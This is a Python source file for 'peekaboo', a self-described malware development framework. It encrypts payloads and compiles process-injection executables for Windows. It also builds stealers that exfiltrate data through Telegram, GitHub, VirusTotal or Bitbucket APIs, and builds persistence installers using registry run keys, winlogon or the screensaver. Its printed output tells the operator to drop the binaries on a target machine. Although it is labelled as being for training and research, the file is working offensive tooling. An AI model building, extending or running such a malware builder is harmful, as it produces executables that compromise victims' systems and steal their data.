# peekaboo.py
from __future__ import annotations
import argparse
import subprocess
import sys
import os
import re
import json
import shutil
from pathlib import Path
from typing import Optional, Dict
from collections import OrderedDict

# regexes (unchanged)
INC_LOCAL_RE = re.compile(r'^\s*#\s*include\s*"([^"]+)"\s*$', re.M)
INC_SYS_RE = re.compile(r'^\s*#\s*include\s*<([^>]+)>\s*$', re.M)
PRAGMA_ONCE_RE = re.compile(r'^\s*#\s*pragma\s+once\s*$', re.M)
IFDEF_GUARD_RE = re.compile(r'^\s*#\s*ifndef\s+([A-Za-z_]\w*)\s*\n\s*#\s*define\s+\1\s*', re.M)
ENDIF_RE = re.compile(r'^\s*#\s*endif\b.*$', re.M | re.M)
PAYLOAD_PLACEHOLDER = "PAYLOAD_PLACEHOLDER"
PERSISTENCE_TYPES = ["none", "registry_run", "winlogon", "screensaver"]


class Colors:
    """ANSI colors + small helpers for consistent logging"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

    @staticmethod
    def success(message: str) -> str:
        return f"{Colors.GREEN}[=^..^=] {message} [=^..^=] {Colors.ENDC}"

    @staticmethod
    def error(message: str) -> str:
        return f"{Colors.RED}[=^..^=] {message} [=^..^=] {Colors.ENDC}"

    @staticmethod
    def warning(message: str) -> str:
        return f"{Colors.YELLOW}[=^..^=] {message} [=^..^=] {Colors.ENDC}"

    @staticmethod
    def info(message: str) -> str:
        return f"{Colors.BLUE}[=^..^=] {message} [=^..^=] {Colors.ENDC}"

    @staticmethod
    def header(message: str) -> str:
        return f"{Colors.PURPLE}{Colors.BOLD}[=^..^=] {message} [=^..^=] {Colors.ENDC}"

    @staticmethod
    def highlight(message: str) -> str:
        return f"{Colors.BOLD}{message}{Colors.ENDC}"


class Peekaboo:
    banner = """[=^..^=]
[=^..^=] #####  ###### #    #         ##         #####   ####   ####
[=^..^=] #    # #      #   #         #  #        #    # #    # #    #
[=^..^=] #    # #####  ####   ##### #    # ##### #####  #    # #    #
[=^..^=] #####  #      #  #         ######       #    # #    # #    #
[=^..^=] #      #      #   #        #    #       #    # #    # #    #
[=^..^=] #      ###### #    #       #    #       #####   ####   ####
[=^..^=]
[=^..^=] Malware Development Framework (for trainings, education and research)
[=^..^=] by @cocomelonc - https://cocomelonc.github.io
"""

    def __init__(self, malware_type: str, payload_name: str, encryption_algo: str, injection_type: str, stealer_api: str, persistence_type: str = "none"):
        try:
            print(Colors.highlight(self.banner))
            print(Colors.header("init peekaboo builder with params"))
            print(Colors.info(f"malware: {malware_type}"))
            print(Colors.info(f"payload: {payload_name}"))
            print(Colors.info(f"encryption: {encryption_algo}"))
            print(Colors.info(f"injection: {injection_type}"))
            print(Colors.info(f"stealer: {stealer_api}"))
            print(Colors.info(f"persistence: {persistence_type}"))
        except Exception:
            pass

        self.malware_type = malware_type
        self.payload_name = payload_name
        self.encryption_algo = encryption_algo
        self.injection_type = injection_type
        self.stealer_api = stealer_api
        self.persistence_type = persistence_type

        # compiler discovery
        self.mingw_path = self._find_mingw()
        self.gcc_path = self._find_gcc()
        self.compiler_flags = [
            '-ffunction-sections',
            '-fdata-sections',
            '-Wno-write-strings',
            '-fno-exceptions',
            '-fmerge-all-constants',
            '-static-libstdc++',
            '-static-libgcc',
            '-fpermissive',
            '-s',
            '-O2'
        ]

        # templates / payloads
        try:
            self.templates_dir = Path(__file__).parent / "malware"
        except Exception:
            # fallback to cwd
            self.templates_dir = Path.cwd() / "malware"
        self.encryption_dir = self.templates_dir / "crypto"
        self.payloads_dir = Path(__file__).parent / "payloads"
        self._templates_cache: Dict[str, str] = {}

        # transient state used during merging; initialized per-merge
        self.visited_local = set()
        self.sys_includes: "OrderedDict[str, bool]" = OrderedDict()
        self.root = Path(__file__).parent

    # ---------- compilation helpers ----------
    def compile_encryptor(self, source_path: Path, output_path: Path) -> Optional[Path]:
        """compile C source to linux binary"""
        try:
            if not self.gcc_path:
                print(Colors.error("gcc not found. please install gcc"))
                return None

            src = Path(source_path)
            out = Path(output_path)
            out.parent.mkdir(parents=True, exist_ok=True)

            gcc_bin = self.gcc_path / "bin" / "gcc" if (self.gcc_path / "bin" / "gcc").exists() else self.gcc_path / "gcc"
            cmd = [str(gcc_bin), str(src), '-o', str(out)]
            print(Colors.info(f"compiling: {' '.join(cmd)}"))

            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                try:
                    if src.exists():
                        src.unlink()
                except Exception:
                    pass
                print(Colors.success("compilation successful"))
                return out
            else:
                print(Colors.error("compilation failed:"))
                print(Colors.error(f"stdout: {result.stdout}"))
                print(Colors.error(f"stderr: {result.stderr}"))
                return None

        except Exception as e:
            print(Colors.error(f"compilation error: {e}"))
            return None

    def compile_cpp(self, source_path: Path, output_path: Path) -> Optional[Path]:
        """compile C++ source to Windows executable using mingw"""
        try:
            if not self.mingw_path:
                print(Colors.error("mingw not found. please install mingw-w64"))
                return None

            src = Path(source_path)
            out = Path(output_path)
            out.parent.mkdir(parents=True, exist_ok=True)

            gpp = (self.mingw_path / "bin" / "x86_64-w64-mingw32-g++")
            if not gpp.exists():
                gpp = self.mingw_path / "x86_64-w64-mingw32-g++"

            cmd = [str(gpp), *self.compiler_flags, str(src), '-o', str(out)]
            print(Colors.info(f"compiling: {' '.join(cmd)}"))

            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                try:
                    if src.exists():
                        src.unlink()
                except Exception:
                    pass
                print(Colors.success("compilation successful"))
                return out
            else:
                print(Colors.error("compilation failed:"))
                print(Colors.error(f"stdout: {result.stdout}"))
                print(Colors.error(f"stderr: {result.stderr}"))
                return None
        except Exception as e:
            print(Colors.error(f"compilation error: {e}"))
            return None

    def compile_c(self, source_path: Path, output_path: Path, extra_libs: list = None) -> Optional[Path]:
        """compile C source to Windows executable using mingw"""
        try:
            if not self.mingw_path:
                print(Colors.error("mingw not found. please install mingw-w64"))
                return None

            src = Path(source_path)
            out = Path(output_path)
            out.parent.mkdir(parents=True, exist_ok=True)

            gcc = (self.mingw_path / "bin" / "x86_64-w64-mingw32-gcc")
            if not gcc.exists():
                gcc = self.mingw_path / "x86_64-w64-mingw32-gcc"

            cmd = [str(gcc), *self.compiler_flags, str(src), '-o', str(out)] + (extra_libs or [])
            print(Colors.info(f"compiling: {' '.join(cmd)}"))

            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                print(Colors.success("compilation successful"))
                try:
                    if src.exists():
                        src.unlink()
                except Exception:
                    pass
                return out
            else:
                print(Colors.error("compilation failed:"))
                print(Colors.error(f"stdout: {result.stdout}"))
                print(Colors.error(f"stderr: {result.stderr}"))
                return None
        except Exception as e:
            print(Colors.error(f"compilation error: {e}"))
            return None

    # ---------- tool discovery ----------
    def _find_mingw(self) -> Optional[Path]:
        """find MinGW installation paths heuristically"""
        try:
            if shutil.which("x86_64-w64-mingw32-g++"):
                return Path("/usr")  # assume standard packaging layout

            possible_paths = [
                Path("/usr/bin"),
                Path("/usr/local/bin"),
                Path("/opt/mingw64"),
                Path("/usr/x86_64-w64-mingw32"),
                Path.home() / "mingw64",
            ]
            for p in possible_paths:
                if (p / "bin" / "x86_64-w64-mingw32-g++").exists():
                    return p
            # not found
            print(Colors.error("mingw-w64 not found. please install it."))
            print(Colors.info("ubuntu/debian/kali/parrot: sudo apt install mingw-w64"))
            return None
        except Exception as e:
            print(Colors.error(f"error while searching for mingw: {e}"))
            return None

    def _find_gcc(self) -> Optional[Path]:
        """find gcc installation paths heuristically"""
        try:
            if shutil.which("gcc"):
                return Path("/usr")
            possible_paths = [
                Path("/usr/bin"),
                Path("/usr/local/bin"),
                Path("/opt/gcc"),
                Path("/usr/gcc"),
                Path.home() / "gcc"
            ]
            for p in possible_paths:
                if (p / "bin" / "gcc").exists():
                    return p
            print(Colors.error("gcc not found. please install it."))
            print(Colors.info("ubuntu/debian/kali/parrot: sudo apt install gcc"))
            return None
        except Exception as e:
            print(Colors.error(f"error while searching for gcc: {e}"))
            return None

    def check_dependencies(self) -> bool:
        """check for required compiler tools (best-effort)"""
        try:
            if not self.mingw_path:
                print(Colors.warning("mingw path not detected; some targets may not be buildable"))
                return False

            required = [
                "x86_64-w64-mingw32-g++",
                "x86_64-w64-mingw32-gcc",
                "gcc",
            ]
            ok = True
            for tool in required:
                # check in PATH first
                if shutil.which(tool):
                    continue
                # then check mingw_path/bin
                tool_path = self.mingw_path / "bin" / tool
                if not tool_path.exists():
                    print(Colors.error(f"missing tool: {tool}"))
                    ok = False
            if ok:
                print(Colors.success("compiler: all dependencies found"))
            return ok
        except Exception as e:
            print(Colors.error(f"error checking dependencies: {e}"))
            return False

    # ---------- templates / payloads ----------
    def _load_template(self, template_path: Path) -> Optional[str]:
        try:
            key = str(template_path)
            if key in self._templates_cache:
                return self._templates_cache[key]
            if template_path.exists():
                text = template_path.read_text(encoding="utf-8")
                self._templates_cache[key] = text
                print(Colors.success(f"successfully load template: {template_path}"))
                return text
            else:
                print(Colors.error(f"template not found: {template_path}"))
                return None
        except Exception as e:
            print(Colors.error(f"error loading template {template_path}: {e}"))
            return None

    def get_injection_template(self) -> Optional[str]:
        try:
            print(Colors.header(f"get injection template: {self.injection_type}"))
            template_path = self.templates_dir / "injection" / self.injection_type / "hack.c"
            return self._load_template(template_path)
        except Exception as e:
            print(Colors.error(f"error getting injection template: {e}"))
            return None

    def get_persistence_template(self, persistence_type: str) -> Optional[str]:
        try:
            template_path = self.templates_dir / "persistence" / f"{persistence_type}.c"
            return self._load_template(template_path)
        except Exception as e:
            print(Colors.error(f"error getting persistence template: {e}"))
            return None

    def get_crypto_encryption_template(self, crypto_type: str) -> Optional[str]:
        try:
            print(Colors.header(f"get crypto encryption: {crypto_type}"))
            template_path = self.templates_dir / "crypto" / crypto_type / "encrypt.c"
            return self._load_template(template_path)
        except Exception as e:
            print(Colors.error(f"error getting crypto encryption template: {e}"))
            return None

    def get_crypto_decryption_template(self, crypto_type: str) -> Optional[str]:
        try:
            template_path = self.templates_dir / "crypto" / crypto_type / "decrypt.c"
            return self._load_template(template_path)
        except Exception as e:
            print(Colors.error(f"error getting crypto decryption template: {e}"))
            return None

    def get_stealer_template(self, stealer_type: str) -> Optional[str]:
        try:
            template_path = self.templates_dir / "stealer" / f"{stealer_type}.c"
            return self._load_template(template_path)
        except Exception as e:
            print(Colors.error(f"error getting stealer template: {e}"))
            return None

    def get_payload(self, payload_type: str) -> Optional[str]:
        try:
            print(Colors.header(f"get payload: {payload_type}"))
            payload_path = self.payloads_dir / f"{payload_type}.c"
            return self._load_payload(payload_path)
        except Exception as e:
            print(Colors.error(f"error getting payload: {e}"))
            return None

    def _load_payload(self, payload_path: Path) -> Optional[str]:
        try:
            if payload_path.exists():
                content = payload_path.read_text(encoding="utf-8")
                print(Colors.success(f"successfully load payload: {payload_path}"))
                # avoid spamming full payload to log in production, but keep a short preview
                preview = content[:200].replace("\n", "\\n")
                print(Colors.info(f"payload preview: {preview}..."))
                return content
            else:
                print(Colors.error(f"payload not found: {payload_path}"))
                return None
        except Exception as e:
            print(Colors.error(f"error loading payload {payload_path}: {e}"))
            return None

    # ---------- encryption helper ----------
    def build_and_compile_encryptor(self, tmp_data: str, payload_data: str) -> Optional[Path]:
        """compose encryptor source with payload and compile it"""
        try:
            if tmp_data is None or payload_data is None:
                print(Colors.error("encryptor template or payload is None"))
                return None
            try:
                tmp_data = tmp_data.replace('"' + PAYLOAD_PLACEHOLDER + '"', payload_data)
            except Exception:
                # best-effort replacement
                tmp_data = tmp_data.replace(PAYLOAD_PLACEHOLDER, payload_data)

            encrypt_c = self.encryption_dir / self.encryption_algo / "encrypt_payload.c"
            encrypt_bin = self.encryption_dir / self.encryption_algo / "encrypt"
            encrypt_c.parent.mkdir(parents=True, exist_ok=True)
            encrypt_c.write_text(tmp_data, encoding="utf-8")
            print(Colors.success(f"wrote: {encrypt_c} ({len(tmp_data)} bytes)"))
            return self.compile_encryptor(encrypt_c, encrypt_bin)
        except Exception as e:
            print(Colors.error(f"build and compile error: {e}"))
            return None

    def encrypt_payload(self) -> Optional[str]:
        """run compiled encryptor and parse its output into C string chunks"""
        try:
            payload_data = self.get_payload(self.payload_name)
            tmp_template = self.get_crypto_encryption_template(self.encryption_algo)
            bin_path = self.build_and_compile_encryptor(tmp_template, payload_data)
            if not bin_path or not bin_path.exists():
                print(Colors.error("encryptor binary not available"))
                return None

            print(Colors.header("encrypt payload..."))
            result = subprocess.run([str(bin_path)], capture_output=True, text=True)
            if result.returncode != 0:
                print(Colors.error("encryptor execution failed"))
                print(Colors.error(f"stdout: {result.stdout}"))
                print(Colors.error(f"stderr: {result.stderr}"))
                return None

            hexes = re.findall(r'\\x[0-9a-fA-F]{2}', result.stdout)
            if not hexes:
                print(Colors.warning("no hex escapes found in encryptor output"))
                try:
                    bin_path.unlink()
                except Exception:
                    pass
                return None

            encrypted_payload = ''.join(hexes)
            print(Colors.info(f"encrypted payload length (hex bytes): {len(encrypted_payload)}"))
            # format into C-friendly string chunks
            per_line = 16
            chunk = per_line * 4  # chars per chunk (hex escape pairs)
            lines = ['"{}"'.format(encrypted_payload[i:i + chunk]) for i in range(0, len(encrypted_payload), chunk)]
            c_src = "\n".join(lines)
            print(Colors.info("encrypted C payload: \n" + (c_src[:1000] + "..." if len(c_src) > 1000 else c_src)))
            print(Colors.success("successfully encrypt payload"))
            try:
                bin_path.unlink()
            except Exception:
                pass
            return c_src
        except Exception as e:
            print(Colors.error(f"error encrypting payload: {e}"))
            return None

    # ---------- builder utilities ----------
    def builder_read_text(self, path: Path) -> str:
        try:
            return path.read_text(encoding='utf-8')
        except UnicodeDecodeError:
            try:
                return path.read_text(encoding='latin-1')
            except Exception as e:
                raise

    def builder_strip_include_guards(self, src: str) -> str:
        try:
            src = PRAGMA_ONCE_RE.sub('', src)
            m = IFDEF_GUARD_RE.search(src)
            if m:
                # remove top guard block and last endif
                src = src[:m.start()] + src[m.end():]
                endif_positions = [mo for mo in ENDIF_RE.finditer(src)]
                if endif_positions:
                    last = endif_positions[-1]
                    src = src[:last.start()] + src[last.end():]
            return src
        except Exception:
            return src

    def builder_extract_system_includes(self, src: str) -> str:
        try:
            for m in INC_SYS_RE.finditer(src):
                self.sys_includes[m.group(1)] = True
            return INC_SYS_RE.sub('', src)
        except Exception:
            return src

    def builder_inline_local_includes(self, src: str, base_dir: Path) -> str:
        """inline local includes recursively"""
        try:
            def repl(m: re.Match):
                try:
                    relpath = m.group(1)
                    candidate = (base_dir / relpath).resolve()
                    if not candidate.exists():
                        matches = list(self.root.rglob(relpath))
                        candidate = matches[0].resolve() if matches else None
                    if not candidate or not candidate.exists():
                        return m.group(0)  # leave as-is

                    if candidate in self.visited_local:
                        return f"/* skipped duplicate include {relpath} */"

                    self.visited_local.add(candidate)
                    code = self.builder_read_text(candidate)
                    code = self.builder_strip_include_guards(code)
                    code = self.builder_extract_system_includes(code)
                    code = self.builder_inline_local_includes(code, candidate.parent)
                    rel = candidate.relative_to(self.root) if candidate.is_relative_to(self.root) else candidate
                    return f"\n/* >>> inlined: {rel} */\n{code}\n/* <<< end inlined: {rel} */\n"
                except Exception as e:
                    return m.group(0)

            return INC_LOCAL_RE.sub(repl, src)
        except Exception:
            return src

    def builder_process_file(self, path: Path) -> str:
        try:
            src = self.builder_read_text(path)
            src = self.builder_strip_include_guards(src)
            src = self.builder_extract_system_includes(src)
            src = self.builder_inline_local_includes(src, path.parent)
            return src
        except Exception as e:
            print(Colors.error(f"error processing file {path}: {e}"))
            return ""

    def builder_merge(self, crypto_path: Path, main_path: Path) -> str:
        try:
            print(Colors.header("merging all functions..."))
            if not crypto_path.exists():
                print(Colors.error(f"crypto file not found: {crypto_path}"))
            if not main_path.exists():
                print(Colors.error(f"main file not found: {main_path}"))

            # reset state
            self.visited_local = set()
            self.sys_includes = OrderedDict()

            crypto_code = self.builder_process_file(crypto_path) if crypto_path.exists() else ""
            main_code = self.builder_process_file(main_path) if main_path.exists() else ""

            header_lines = ["/* generated by peekaboo builder merging logic */"]
            for inc in self.sys_includes.keys():
                header_lines.append(f"#include <{inc}>")
            header_lines.append("")

            parts = []
            parts.extend(header_lines)
            parts.append(f"/* === decryption unit: {crypto_path.relative_to(Path(__file__).parent) if crypto_path.exists() else 'N/A'} === */")
            parts.append(crypto_code.strip())
            parts.append(f"/* === main unit: {main_path.relative_to(Path(__file__).parent) if main_path.exists() else 'N/A'} === */")
            parts.append(main_code.strip())

            return "\n\n".join(parts)
        except Exception as e:
            print(Colors.error(f"error during merge: {e}"))
            return ""

    def _load_config(self, config_path: Path) -> Optional[dict]:
        try:
            if config_path.exists():
                with config_path.open("r", encoding="utf-8") as f:
                    data = json.load(f)
                    print(Colors.success(f"successfully load config: {config_path}"))
                    return data
            else:
                print(Colors.error(f"config not found: {config_path}"))
                return None
        except Exception as e:
            print(Colors.error(f"error loading config {config_path}: {e}"))
            return None

    # ---------- main build flow ----------
    def build_and_compile_malware(self, encrypted_payload: Optional[str]) -> None:
        try:
            if not encrypted_payload:
                print(Colors.error("no encrypted payload provided, aborting build"))
                return

            tmp_template = self.get_injection_template()
            if tmp_template is None:
                print(Colors.error("injection template missing"))
                return

            try:
                data = tmp_template.replace('"' + PAYLOAD_PLACEHOLDER + '"', encrypted_payload)
            except Exception:
                data = tmp_template.replace(PAYLOAD_PLACEHOLDER, encrypted_payload)

            hack_encrypted = self.templates_dir / "injection" / self.injection_type / "hack_encrypted.c"
            hack_encrypted.parent.mkdir(parents=True, exist_ok=True)
            hack_encrypted.write_text(data, encoding="utf-8")

            decrypt_file = self.templates_dir / "crypto" / self.encryption_algo / "decrypt.c"
            main_file = hack_encrypted
            combined = self.builder_merge(decrypt_file, main_file)

            outp = self.templates_dir / "injection" / self.injection_type / "hack_final.c"
            outp.parent.mkdir(parents=True, exist_ok=True)
            outp.write_text(combined, encoding="utf-8")
            print(Colors.success("successfully merged"))
            os.remove(hack_encrypted)
            print(Colors.success(f"wrote {outp} ({len(combined)} bytes)"))

            # compile final
            target = outp.with_name("peekaboo.exe")
            self.compile_cpp(outp, target)
        except Exception as e:
            print(Colors.error(f"error building/compiling malware: {e}"))

    def _stealer_substitutions(self) -> dict:
        cfg_dir = Path(__file__).parent / "config"
        subs = {}
        if self.stealer_api == "telegram":
            cfg = self._load_config(cfg_dir / "telegram_config.json") or {}
            subs["TELEGRAM_CHAT_ID_PLACEHOLDER"]   = cfg.get("chat_id", "")
            subs["TELEGRAM_BOT_TOKEN_PLACEHOLDER"] = cfg.get("bot_token", "")
        elif self.stealer_api == "github":
            cfg = self._load_config(cfg_dir / "github_config.json") or {}
            subs["github_classic_token"]           = cfg.get("github_token", "")
            subs["GITHUB_REPO_OWNER_PLACEHOLDER"]  = cfg.get("repo_owner", "")
            subs["GITHUB_REPO_NAME_PLACEHOLDER"]   = cfg.get("repo_name", "")
            subs["GITHUB_ISSUE_NUMBER_PLACEHOLDER"] = cfg.get("issue_number", "1")
        elif self.stealer_api == "virustotal":
            cfg = self._load_config(cfg_dir / "virustotal_config.json") or {}
            subs["VT_API_KEY_PLACEHOLDER"]         = cfg.get("vt_api_key", "")
            subs["VT_API_FILE_ID_PLACEHOLDER"]     = cfg.get("file_id", "")
        elif self.stealer_api == "bitbucket":
            cfg = self._load_config(cfg_dir / "bitbucket_config.json") or {}
            subs["BITBUCKET_TOKEN_PLACEHOLDER"]     = cfg.get("bitbucket_token_base64", "")
            subs["BITBUCKET_WORKSPACE_PLACEHOLDER"] = cfg.get("bitbucket_workspace", "")
            subs["BITBUCKET_REPO_PLACEHOLDER"]      = cfg.get("bitbucket_repo", "")
        return subs

    def build_and_compile_stealer(self) -> Optional[Path]:
        try:
            print(Colors.header(f"building stealer: {self.stealer_api}"))
            src = self.get_stealer_template(self.stealer_api)
            if not src:
                print(Colors.error(f"stealer template not found: {self.stealer_api}"))
                return None

            subs = self._stealer_substitutions()
            for placeholder, value in subs.items():
                src = src.replace(placeholder, value)

            out_dir = self.templates_dir / "stealer" / self.stealer_api
            out_dir.mkdir(parents=True, exist_ok=True)
            stealer_c = out_dir / "stealer_final.c"
            stealer_c.write_text(src, encoding="utf-8")
            print(Colors.success(f"wrote stealer source: {stealer_c}"))

            stealer_exe = out_dir / "peekaboo.exe"
            result = self.compile_c(stealer_c, stealer_exe,
                                    extra_libs=["-lwinhttp", "-liphlpapi"])
            return result
        except Exception as e:
            print(Colors.error(f"error building stealer: {e}"))
            return None

    def build_persistence_binary(self, malware_out_dir: Path) -> Optional[Path]:
        try:
            print(Colors.header(f"building persistence binary: {self.persistence_type}"))
            pers_src = self.get_persistence_template(self.persistence_type)
            if not pers_src:
                print(Colors.error(f"persistence template not found: {self.persistence_type}"))
                return None

            pers_c = self.templates_dir / "persistence" / f"{self.persistence_type}_build.c"
            pers_c.write_text(pers_src, encoding="utf-8")

            pers_out = malware_out_dir / "persistence.exe"
            result = self.compile_c(pers_c, pers_out)
            try:
                if pers_c.exists():
                    pers_c.unlink()
            except Exception:
                pass
            return result
        except Exception as e:
            print(Colors.error(f"error building persistence binary: {e}"))
            return None

    def _print_instructions(self, malware_exe: Path, persistence_exe: Optional[Path]) -> None:
        try:
            sep = Colors.highlight("=" * 58)
            print(sep)
            print(Colors.header("build complete - generated files"))
            print(Colors.success(f"malware:     {malware_exe}"))
            if persistence_exe and persistence_exe.exists():
                print(Colors.success(f"persistence: {persistence_exe}"))
            print(sep)
            if persistence_exe and persistence_exe.exists():
                print(Colors.header("deployment instructions"))
                print(Colors.info("1. drop both files to the target machine:"))
                print(Colors.info(f"     peekaboo.exe    - malware payload"))
                print(Colors.info(f"     persistence.exe - persistence installer ({self.persistence_type})"))
                print(Colors.info("2. run persistence installer (optionally pass target path):"))
                print(Colors.info(f"     persistence.exe"))
                print(Colors.info(f"     persistence.exe C:\\Users\\Public\\peekaboo.exe"))
                print(Colors.info("3. if no path given, installer looks for peekaboo.exe"))
                print(Colors.info("   in the same directory as persistence.exe"))
                if self.persistence_type == "winlogon":
                    print(Colors.warning("note: winlogon requires SYSTEM/admin privileges"))
            print(sep)
        except Exception:
            pass

    def run(self) -> None:
        try:
            self.check_dependencies()

            if self.malware_type == "stealer":
                malware_exe = self.build_and_compile_stealer()
                self._print_instructions(malware_exe, None)
            else:
                encrypted_payload = self.encrypt_payload()
                if encrypted_payload is None:
                    print(Colors.error("encryption step failed; aborting"))
                    return
                self.build_and_compile_malware(encrypted_payload)

                malware_exe = self.templates_dir / "injection" / self.injection_type / "peekaboo.exe"
                persistence_exe = None

                if self.persistence_type != "none":
                    malware_out_dir = self.templates_dir / "injection" / self.injection_type
                    persistence_exe = self.build_persistence_binary(malware_out_dir)

                self._print_instructions(malware_exe, persistence_exe)
        except Exception as e:
            print(Colors.error(f"fatal error in run(): {e}"))


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--payload', required=False, help="payload", default="meow")
    parser.add_argument('-e', '--encryption', required=False, help="payload encryption algorithm", default="speck")
    parser.add_argument("-m", '--malware', required=False, help="injection or stealer", default="injection")
    parser.add_argument("-i", '--injection', required=False, help="injection type (for injection)", default="virtualallocex")
    parser.add_argument("-s", '--stealer', required=False, help="stealer API (for stealer)", default="telegram")
    parser.add_argument("-r", '--persistence', required=False, help="persistence technique",
                        default="none", choices=PERSISTENCE_TYPES)
    args = vars(parser.parse_args())

    try:
        peekaboo = Peekaboo(args['malware'], args['payload'], args['encryption'], args['injection'], args['stealer'], args['persistence'])
        peekaboo.run()
    except Exception as e:
        print(Colors.error(f"unhandled exception in __main__: {e}"))
        sys.exit(1)